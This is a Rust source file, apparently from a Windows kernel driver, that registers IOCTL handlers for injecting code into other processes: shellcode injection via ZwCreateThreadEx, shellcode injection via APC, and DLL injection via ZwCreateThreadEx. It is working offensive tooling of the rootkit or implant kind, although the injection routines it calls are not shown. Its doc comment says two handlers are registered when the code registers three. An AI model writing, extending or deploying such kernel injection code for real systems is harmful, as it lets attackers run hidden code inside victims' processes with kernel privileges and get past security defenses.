use {
    alloc::boxed::Box, 
    hashbrown::HashMap,
    wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS},
    crate::{
        handle, 
        injection::{InjectionDLL, InjectionShellcode}, 
        utils::ioctls::IoctlHandler
    }, 
    shared::{
        ioctls::{
            IOCTL_INJECTION_DLL_THREAD, IOCTL_INJECTION_SHELLCODE_APC, 
            IOCTL_INJECTION_SHELLCODE_THREAD
        }, 
        structs::TargetInjection
    }, 
};

/// Registers the IOCTL handlers for injection-related operations.
///
/// This function inserts two IOCTL handlers into the provided `HashMap`, associating them with
/// their respective IOCTL codes. The two operations supported are:
///
/// # Parameters
/// 
/// - `ioctls`: A mutable reference to a `HashMap<u32, IoctlHandler>` where the injection-related
///   IOCTL handlers will be inserted.
///
pub fn get_injection_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
    // Process injection using ZwCreateThreadEx.
    ioctls.insert(IOCTL_INJECTION_SHELLCODE_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, InjectionShellcode::injection_thread, TargetInjection) };
        unsafe { (*irp).IoStatus.Information = 0 };
        
        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);

    // APC Injection.
    ioctls.insert(IOCTL_INJECTION_SHELLCODE_APC, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, InjectionShellcode::injection_apc, TargetInjection) };
        unsafe { (*irp).IoStatus.Information = 0 };
        
        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);

    // DLL injection using ZwCreateThreadEx.
    ioctls.insert(IOCTL_INJECTION_DLL_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, InjectionDLL::injection_dll_thread, TargetInjection) };
        unsafe { (*irp).IoStatus.Information = 0 };

        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);

}